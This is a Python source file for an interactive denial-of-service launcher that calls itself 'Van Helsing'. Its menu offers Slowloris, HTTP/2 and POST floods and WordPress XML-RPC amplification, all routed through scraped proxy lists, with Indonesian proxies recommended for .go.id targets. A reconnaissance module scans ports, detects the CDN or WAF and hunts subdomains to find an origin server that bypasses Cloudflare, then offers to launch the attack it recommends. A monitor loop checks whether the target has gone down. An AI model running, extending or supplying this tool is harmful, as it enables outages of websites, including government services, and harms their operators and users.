#!/usr/bin/env python3
import os
import sys
import subprocess
import random
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{bcolors.OKRED}
    ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
    ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
     ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
    {bcolors.WARNING}Interactive Commander v1.0{bcolors.RESET}
    """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    banner()

    print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] SLOW    - (Best for Windows/Apache/XAMPP)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] DYN     - (Best for Nginx/Cloudflare/Evasion)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] STRESS  - (High Load/Universal Stress Test)")
    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] XMLRPC  - (WordPress Amplification Method)")
    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] POST_DYN- (Phase 2: Non-Cacheable POST Flood)")

    
    # [PHASE 17] Attack Intel Module
    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] ATTACK INTEL (Origin Scan + Auto-Rec)")
    
    # [PHASE 23] Sentinel Monitor
    print(f"[{bcolors.OKCYAN}8{bcolors.RESET}] SENTINEL     (Live Target Monitor)")
    print("")
    
    choice = input(f"{bcolors.BOLD}Choose Method (1-8): {bcolors.RESET}")
    
    if choice == "7":
        run_intel()
        sys.exit(0)
    elif choice == "8":
        run_sentinel()
        sys.exit(0)

    methods = {"1": "SLOW", "2": "DYN", "3": "STRESS", "4": "XMLRPC", "5": "POST_DYN", "6": "H2_FLOOD"}
    method = methods.get(choice, "SLOW")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ TARGET CONFIGURATION ]{bcolors.RESET}")
    url = input(f"Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if origin_ip:
        target = f"{url}@{origin_ip}"
    else:
        target = url

    clear()
    banner()
    print(f"{bcolors.HEADER}[ PROXY CONFIGURATION ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Proxy (Auto-Scavenge/Download)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Private Proxy (From your own file)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] Indonesian Scavenger (Auto-find Indo Proxies)")
    
    proxy_choice = input(f"{bcolors.BOLD}Choose Proxy Type (1-3): {bcolors.RESET}")
    
    if proxy_choice == "2":
        proxy_file = input(f"Enter proxy filename (e.g. proxy.txt): {bcolors.OKBLUE}").strip()
        proxy_type = "5"
        print(f"{bcolors.RESET}", end="")
    elif proxy_choice == "3":
        proxy_file = "proxy.txt"
        proxy_type = "7" # Indo Scavenger mode
    else:
        proxy_file = "proxy.txt"
        proxy_type = "5"

    clear()
    banner()
    print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
    print(f"{bcolors.WARNING}Note: Running multiple terminals is better than high thread counts.{bcolors.RESET}")
    
    threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
    print(f"{bcolors.RESET}", end="")
    
    rpc = input(f"RPC (Requests Per Connection, Default: 5): {bcolors.OKBLUE}").strip() or "5"
    print(f"{bcolors.RESET}", end="")
    
    duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
    print(f"{bcolors.RESET}", end="")

    # Preparation for execution
    # MHDDoS/VanHelsing structure: python3 start.py <METHOD> <URL> <PROXY_TYPE> <THREADS> <PROXY_FILE> <RPC> <DURATION>

    cmd = [
        sys.executable, "start.py",
        method,
        target,
        proxy_type,
        threads,
        proxy_file,
        rpc,
        duration
    ]

    clear()
    banner()
    print(f"{bcolors.OKGREEN}CONFIGURATION COMPLETE!{bcolors.RESET}")
    print(f"Method   : {bcolors.OKBLUE}{method}{bcolors.RESET}")
    print(f"Target   : {bcolors.OKBLUE}{target}{bcolors.RESET}")
    print(f"Threads  : {bcolors.OKBLUE}{threads}{bcolors.RESET}")
    print(f"Duration : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
    print("-" * 30)
    print(f"{bcolors.BOLD}Launching Attack...{bcolors.RESET}")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")

def run_intel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER PRO ]{bcolors.RESET}")
    target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if "://" in target:
        target_domain = target.split("://")[1].split("/")[0]
        target_url = target
    else:
        target_domain = target.split("/")[0]
        target_url = f"https://{target}"

    # Initialize common subdomains for Zone Hunter
    common_subs = ["origin", "direct", "cpanel", "mail", "dev", "test", "api", "ftp", "beta", "admin", "secure", "www1", "web"]

    print("-" * 40)
    
    # [PHASE 21] Stealth Mode (Proxy Support)
    use_proxy = False
    proxies = None
    print(f"{bcolors.WARNING}[?] Enable Stealth Mode (Use Proxies for Scan)? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        use_proxy = True
        
        # [NEW] Auto-Refresh Logic (Copied from Sentinel)
        need_download = False
        if not os.path.exists("proxy.txt"):
             print(f"{bcolors.FAIL}[!] proxy.txt not found!{bcolors.RESET}")
             need_download = True
        else:
             print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it with FRESH proxies? (y/n): {bcolors.RESET}", end="")
             if input().lower().startswith("y"):
                  need_download = True
        
        if need_download:
             print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
             print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
             print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
             print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")

             rec = "2" if ".id" in target else "1"
             p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
             
             if p_opt == "1":
                 print(f"{bcolors.WARNING}[*] Fetching Public Mix from multiple sources...{bcolors.RESET}")
                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > proxy.txt")
                 os.system("curl -s https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt >> proxy.txt")
                 os.system("curl -s https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt >> proxy.txt")
                 os.system("curl -s https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt >> proxy.txt")
             elif p_opt == "2":
                 print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > proxy.txt")
             elif p_opt == "3":
                 print(f"{bcolors.WARNING}[*] Fetching Mixed Proxies (Mega-Pack: Public + Indo API)...{bcolors.RESET}")
                 # 1. Download Public Lists
                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > public.txt")
                 os.system("curl -s https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt >> public.txt")
                 os.system("curl -s https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt >> public.txt")
                 os.system("curl -s https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt >> public.txt")
                 
                 # 2. Download Indo List
                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > indo.txt")
                 try:
                     with open("public.txt", "r", encoding="utf-8", errors="ignore") as f1, \
                          open("indo.txt", "r", encoding="utf-8", errors="ignore") as f2, \
                          open("proxy.txt", "w", encoding="utf-8") as out:
                         c1 = f1.read()
                         c2 = f2.read()
                         out.write(c1 + "\n" + c2)
                 except: pass
                 if os.path.exists("public.txt"): os.remove("public.txt")
                 if os.path.exists("indo.txt"): os.remove("indo.txt")
                 
                 # 3. Clean Duplicates
                 if os.path.exists("proxy.txt"):
                      unique_lines = set()
                      with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
                          for line in f:
                              if ":" in line: unique_lines.add(line.strip())
                      with open("proxy.txt", "w", encoding="utf-8") as f:
                          f.write("\n".join(unique_lines))

        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
        try:
            with open("proxy.txt", "r") as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            if not proxy_list:
                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
                use_proxy = False
            else:
                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxy_list)} proxies.{bcolors.RESET}")
        except FileNotFoundError:
             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
             use_proxy = False

    print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
    
    resolved_ip = None
    try:
        import socket
        resolved_ip = socket.gethostbyname(target_domain)
        print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
    except Exception as e:
        print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")

    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner...{bcolors.RESET}")
    open_ports = []
    interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2) # Increased timeout for accuracy since we are threaded
            result = sock.connect_ex((target_domain, port))
            sock.close()
            if result == 0:
                print(f"[*] Port {port:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
                return port
        except:
            pass
        return None

    try:
        import socket
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_port, p) for p in interesting_ports]
            for future in concurrent.futures.as_completed(futures):
                p = future.result()
                if p: open_ports.append(p)

        if not open_ports:
            print(f"[*] Ports      : {bcolors.WARNING}No common opened ports found (FW Blocked?){bcolors.RESET}")
    except Exception as e:
        print(f"[!] Port Scan Error: {e}")

    print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
    # Initialize Defaults
    cms_detected = "Unknown"
    vuln_vector = None
    server_header = "Unknown"
    cdn_guess = "Unknown"
    
    # helper scope
    get_req_kwargs = None
    get_robust_response = None
    head_robust_response = None
    
    # Setup Block
    try:
        import requests
        import urllib3
        urllib3.disable_warnings() 
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        
        def _get_req_kwargs():
            # [OPTIMIZATION] Reduced timeout from 10s to 4s for faster rotation
            kwargs = {'headers': headers, 'timeout': 4, 'verify': False}
            if use_proxy and proxy_list:
                p = random.choice(proxy_list)
                if "://" not in p: p = f"http://{p}"
                kwargs['proxies'] = {'http': p, 'https': p}
            return kwargs
        get_req_kwargs = _get_req_kwargs

        def _get_robust_response(url, retries=50):
            # Persistent Retry Mode: Tries up to 50 times (User requested "until success")
            for i in range(retries):
                try:
                    kwargs = get_req_kwargs()
                    if i > 0:
                        # Padded with spaces to overwrite previous line completely
                        print(f"{bcolors.WARNING}[-] Connection Failed. Rotating Proxy & Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
                    return requests.get(url, **kwargs)
                except Exception:
                    if not use_proxy: raise 
                    continue
            raise Exception("Max retries exceeded (Pro Tip: Check your connection or Proxy List!)")
        get_robust_response = _get_robust_response
            
        def _head_robust_response(url, retries=50):
             for i in range(retries):
                try:
                    kwargs = get_req_kwargs()
                    if i > 0:
                        print(f"{bcolors.WARNING}[-] Connection Failed. Rotating Proxy & Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
                    return requests.head(url, **kwargs)
                except Exception:
                    if not use_proxy: raise
                    continue
             raise Exception("Max retries exceeded")
        head_robust_response = _head_robust_response

    except ImportError:
         print(f"{bcolors.FAIL}[!] Missing requests library.{bcolors.RESET}")
         return

    # Phase 3 Logic Block
    try:
        # 1. Base Check
        r = head_robust_response(target_url)
        server_header = r.headers.get('Server', 'Unknown')
        powered_by = r.headers.get('X-Powered-By', 'Unknown')
        print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")

        # 2. WAF Detection
        wafs = {
            "cloudflare": "Cloudflare", "akamai": "Akamai", "fastly": "Fastly", 
            "imperva": "Imperva", "incapsula": "Imperva", "sucuri": "Sucuri"
        }
        headers_str = str(r.headers).lower()
        for key, name in wafs.items():
            if key in headers_str:
                cdn_guess = name
                break
        if cdn_guess != "Unknown":
            print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")

        # 3. WordPress XMLRPC Check
        print("[*] Checking for WordPress XML-RPC...", end="\r")
        try:
            xml_url = f"{target_url}/xmlrpc.php"
            r_xml = get_robust_response(xml_url)
            if r_xml.status_code == 405 or "XML-RPC server accepts POST requests only" in r_xml.text:
                print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                cms_detected = "WordPress"
                vuln_vector = "XMLRPC"
            else:
                 print(f"[*] XML-RPC      : Safe/Not Found           ")
        except:
             print(f"[*] XML-RPC      : Error Checking           ")
             
    except Exception as e:
        print(f"{bcolors.FAIL}[!] Phase 3 Error: {e} (Connection failed or Max Retries){bcolors.RESET}")

        # [PHASE 20] SSL Certificate Inspector (Deep Search)
        print(f"\n{bcolors.OKCYAN}Phase 4: SSL/SNI Inspector (Deep Search)...{bcolors.RESET}")
        ssl_sans = []
        try:
             import ssl
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             with socket.create_connection((target_domain, 443), timeout=5) as sock:
                 with ctx.wrap_socket(sock, server_hostname=target_domain) as ssock:
                     cert = ssock.getpeercert()
                     # In some python versions/platforms getpeercert() return empty if verify_mode=CERT_NONE
                     # We might need to fetch it differently or enable verify temporarily if possible, 
                     # but standard lib often requires a CA bundle.
                     # Let's try to parse commonName or subjectAltName if available.
                     # If CERT_NONE returns nothing, we skip.
                     pass 
             
             # Re-try with active verification for SANs (usually safe)
             ctx = ssl.create_default_context()
             with socket.create_connection((target_domain, 443), timeout=5) as sock:
                 with ctx.wrap_socket(sock, server_hostname=target_domain) as ssock:
                     cert = ssock.getpeercert()
                     for field in cert.get('subjectAltName', []):
                         if field[0] == 'DNS':
                             ssl_sans.append(field[1])
             
             if ssl_sans:
                 print(f"[*] SSL SANs Found: {bcolors.OKGREEN}{len(ssl_sans)} domains{bcolors.RESET}")
                 # Add SANs to common_subs for Zone Hunter
                 common_subs.extend([san.split('.')[0] for san in ssl_sans if target_domain in san])
        except Exception as e:
             print(f"[*] SSL Inspector: {e} (Skipping)")

        # [PHASE 24] CRT.SH Deep Subdomain Recon
        print(f"\n{bcolors.OKCYAN}Phase 4.5: CRT.SH Certificate Search...{bcolors.RESET}")
        try:
             # CRT.SH often times out with proxies, so we try with text/html or json
             crt_url = f"https://crt.sh/?q=%.{target_domain}&output=json"
             r_crt = get_robust_response(crt_url)
             
             if r_crt.status_code == 200:
                 try:
                     crt_data = r_crt.json()
                     crt_subs = set()
                     for entry in crt_data:
                         name = entry.get('name_value', '')
                         if "\n" in name:
                             parts = name.split("\n")
                             for p in parts:
                                 if target_domain in p and "*" not in p:
                                     crt_subs.add(p)
                         elif target_domain in name and "*" not in name:
                             crt_subs.add(name)
                     
                     if crt_subs:
                         print(f"[*] CRT.SH Found  : {bcolors.OKGREEN}{len(crt_subs)} subdomains{bcolors.RESET}")
                         # Add to scanning list (clean duplicates later)
                         for sub in crt_subs:
                             # Extract subdomain part
                             clean = sub.replace(f".{target_domain}", "")
                             common_subs.append(clean)
                     else:
                         print("[*] CRT.SH        : No new subdomains found.")
                 except:
                     print("[*] CRT.SH        : Invalid JSON (Rate Limit?)")
             else:
                 print(f"[*] CRT.SH        : Failed ({r_crt.status_code})")
                 
        except Exception as e:
             print(f"[*] CRT.SH Error  : {e}")


        # [PHASE 19 + 20] Zone Hunter + Content Matcher
        print(f"\n{bcolors.OKCYAN}Phase 5: Zone Hunter & Content Verification...{bcolors.RESET}")
        
        # Unique list
        scan_list = list(set(common_subs))
        exposed_origin = None
        
        # Get Main Site Signature
        main_sig = 0
        try:
            r_main = get_robust_response(target_url)
            main_sig = len(r_main.content)
            print(f"[*] Main Site Size : {main_sig} bytes")
        except:
            pass

        try:
            def check_subdomain(sub):
                sub = sub.strip()
                if not sub: return None
                
                if target_domain in sub: sub_domain = sub 
                else: sub_domain = f"{sub}.{target_domain}"
                
                try:
                    sub_ip = socket.gethostbyname(sub_domain)
                    if sub_ip == resolved_ip: return None # Skip same IP (Cloudflare/WAF)
                    
                    match_status = f"{bcolors.WARNING}UNVERIFIED{bcolors.RESET}"
                    is_origin_candidate = False
                    
                    try:
                        # Verify Content with Robust Retry (Low retries for speed)
                        r_check = get_robust_response(f"http://{sub_domain}", retries=2) 
                        check_sig = len(r_check.content)
                        
                        if main_sig > 0:
                            ratio = abs(main_sig - check_sig) / main_sig
                            if ratio < 0.2:
                                match_status = f"{bcolors.FAIL}CONFIRMED ORIGIN!{bcolors.RESET}"
                                is_origin_candidate = True
                            else:
                                match_status = f"{bcolors.OKCYAN}Content Mismatch{bcolors.RESET}"
                    except:
                        match_status = "Dead/Timeout"
                    
                    return (sub_domain, sub_ip, match_status, is_origin_candidate)
                except:
                    return None

            print(f"[*] Scanning {len(scan_list)} subdomains with 50 threads...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(check_subdomain, sub) for sub in scan_list]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        sub_domain, sub_ip, match_status, is_candidate = result
                        print(f"[*] Found {sub_domain:<30} : {sub_ip} | {match_status}")
                        if is_candidate and not exposed_origin:
                             exposed_origin = sub_domain

        except Exception as e:
            print(f"[!] Zone Hunter Error: {e}")
        except Exception as e:
            print(f"[!] Zone Hunter Error: {e}")

        # Phase 5: Tactical Recommendation
        print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
        
        rec_method = "H2_FLOOD"
        reason = "Standard High-Throughput HTTP/2 Attack"
        cmd_example = f"python3 start.py H2_FLOOD {target_url} 7 100 proxy.txt 50 800"

        if vuln_vector == "XMLRPC":
            rec_method = "XMLRPC"
            reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
        
        elif exposed_origin:
            rec_method = "H2_FLOOD (Origin Bypass)"
            reason = f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
            target_url = f"https://{exposed_origin}"
            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
            
        elif "Apache" in server_header and cdn_guess == "Unknown":
            rec_method = "SLOW"
            reason = "Apache Target without WAF is vulnerable to Slowloris."
            args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
        
        elif 2083 in open_ports or 2087 in open_ports:
            rec_method = "H2_FLOOD (Backend)"
            target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
            
        else:
             args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]


        cmd_string = f"{sys.executable} start.py {' '.join(args)}"

        print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
        print(f"Reason : {reason}")
        print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
        
        print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
        q = input().lower()
        if q.startswith("y"):
             cmd = [sys.executable, "start.py"] + args
             try:
                subprocess.run(cmd)
             except Exception as e:
                print(f"Error: {e}")

        # [PHASE 22] Intel Recorder (Save Report)
        print(f"\n{bcolors.OKCYAN}[?] Save Intel Report to 'intel_report.txt'? (y/n): {bcolors.RESET}", end="")
        if input().lower().startswith("y"):
             try:
                 with open("intel_report.txt", "a") as f:
                     f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_url}\n")
                     f.write(f"   IP: {resolved_ip}\n")
                     f.write(f"   Server: {server_header}\n")
                     if cdn_guess != "Unknown": f.write(f"   WAF: {cdn_guess}\n")
                     if open_ports: f.write(f"   Open Ports: {open_ports}\n")
                     if exposed_origin: f.write(f"   Exposed Origin: {exposed_origin}\n")
                     if vuln_vector: f.write(f"   Vulnerability: {vuln_vector}\n")
                     if ssl_sans: f.write(f"   SSL SANs: {', '.join(ssl_sans[:5])}...\n")
                     f.write(f"   Recommended: {rec_method}\n")
                     f.write("-" * 40 + "\n")
                 print(f"{bcolors.OKGREEN}[+] Report Saved!{bcolors.RESET}")
             except Exception as e:
                 print(f"{bcolors.FAIL}[!] Failed to save report: {e}{bcolors.RESET}")

    except ImportError:
         print(f"{bcolors.FAIL}[!] Missing requests library. run 'pip install requests'{bcolors.RESET}")
    except Exception as e:
         print(f"{bcolors.FAIL}[!] Analysis Error: {e}{bcolors.RESET}")

    print("\nPress Enter to return to menu...")
    input()
    main()

def run_sentinel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ SENTINEL - LIVE TARGET MONITOR ]{bcolors.RESET}")
    target = input(f"Enter Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if not target.startswith("http"):
        target = "https://" + target
        
    print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
    print("-" * 50)
    
    import requests
    import urllib3
    import random
    urllib3.disable_warnings()
    
    # [Stealth Option]
    use_proxy = False
    proxies = []
    print(f"\n{bcolors.WARNING}[?] Use Proxies for Monitoring? (y/n): {bcolors.RESET}", end="")
    if input().lower().startswith("y"):
        use_proxy = True
        
        # Check if we should refresh the list
        need_download = True
        if os.path.exists("proxy.txt"):
             print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it? (y/n): {bcolors.RESET}", end="")
             if not input().lower().startswith("y"):
                 need_download = False
        
        if need_download:
             print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
             print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
             print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
             print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")

             rec = "2" if ".id" in target else "1"
             p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
             
             if p_opt == "1":
                 # Public Mix
                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > proxy.txt")
             elif p_opt == "2":
                 # Indo Only (Using ProxyScrape API for freshness)
                 print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > proxy.txt")
             elif p_opt == "3":
                 # MIXED MODE
                 print(f"{bcolors.WARNING}[*] Fetching Mixed Proxies (Public + Indo API)...{bcolors.RESET}")
                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > public.txt")
                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > indo.txt")
                 
                 # Combine properly with Python to avoid OS syntax issues
                 try:
                     with open("public.txt", "r", encoding="utf-8", errors="ignore") as f1, \
                          open("indo.txt", "r", encoding="utf-8", errors="ignore") as f2, \
                          open("proxy.txt", "w", encoding="utf-8") as out:
                          
                         c1 = f1.read()
                         c2 = f2.read()
                         out.write(c1 + "\n" + c2)
                     
                     print(f"{bcolors.OKGREEN}[+] Combined: {len(c1.splitlines())} Public + {len(c2.splitlines())} Indo{bcolors.RESET}")
                 except Exception as e:
                     print(f"{bcolors.FAIL}[!] Merge Error: {e}{bcolors.RESET}")

                 # Cleanup
                 if os.path.exists("public.txt"): os.remove("public.txt")
                 if os.path.exists("indo.txt"): os.remove("indo.txt")
                 if os.path.exists("proxy.txt"):
                     lines = set()
                     with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
                         lines = set(f.read().splitlines())
                     with open("proxy.txt", "w", encoding="utf-8") as f:
                         f.write("\n".join(lines))
                 
        try:
            with open("proxy.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if not proxies:
                print(f"{bcolors.FAIL}[!] proxy.txt empty! Using Direct.{bcolors.RESET}")
                use_proxy = False
            else:
                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxies)} proxies.{bcolors.RESET}")
        except:
             print(f"{bcolors.FAIL}[!] proxy.txt not found! Using Direct.{bcolors.RESET}")
             use_proxy = False
                 
             # Reload
             try:
                 with open("proxy.txt", "r") as f:
                     proxies = [line.strip() for line in f if line.strip()]
                 print(f"{bcolors.OKGREEN}[*] Loaded {len(proxies)} proxies.{bcolors.RESET}")
             except:
                 print(f"{bcolors.FAIL}[!] Download failed. Using Direct.{bcolors.RESET}")
                 use_proxy = False

    print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
    print("-" * 50)
    
    # Use Full Browser Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Referer': 'https://www.google.com/',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        while True:
            timestamp = time.strftime('%H:%M:%S')
            try:
                # Prepare Proxy
                req_kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
                if use_proxy and proxies:
                     p = random.choice(proxies)
                     if "://" not in p: p = f"http://{p}"
                     req_kwargs['proxies'] = {'http': p, 'https': p}

                start_time = time.time()
                r = requests.get(target, **req_kwargs)
                latency = int((time.time() - start_time) * 1000)
                
                status_color = bcolors.OKGREEN
                if r.status_code >= 500:
                    status_color = bcolors.FAIL
                elif r.status_code >= 400:
                    status_color = bcolors.WARNING
                elif latency > 1000:
                   status_color = bcolors.WARNING
                
                print(f"[{timestamp}] Status: {status_color}{r.status_code}{bcolors.RESET} | Time: {latency}ms")
                
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
                 # Most likely Proxy issues if proxy is enabled
                 msg = "TIMEOUT" if not use_proxy else "PROXY LAG"
                 print(f"[{timestamp}] Status: {bcolors.WARNING}{msg}{bcolors.RESET} | Retrying with new proxy...")
            except requests.exceptions.ConnectionError:
                 msg = "DOWN" if not use_proxy else "CONN FAIL"
                 print(f"[{timestamp}] Status: {bcolors.FAIL}{msg}{bcolors.RESET}    | Target or Proxy Unreachable")
            except Exception as e:
                print(f"[{timestamp}] Status: {bcolors.FAIL}ERROR{bcolors.RESET}   | {e}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Sentinel Stopped.{bcolors.RESET}")
        time.sleep(1)
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Exiting Van Helsing...{bcolors.RESET}")
        sys.exit(0)
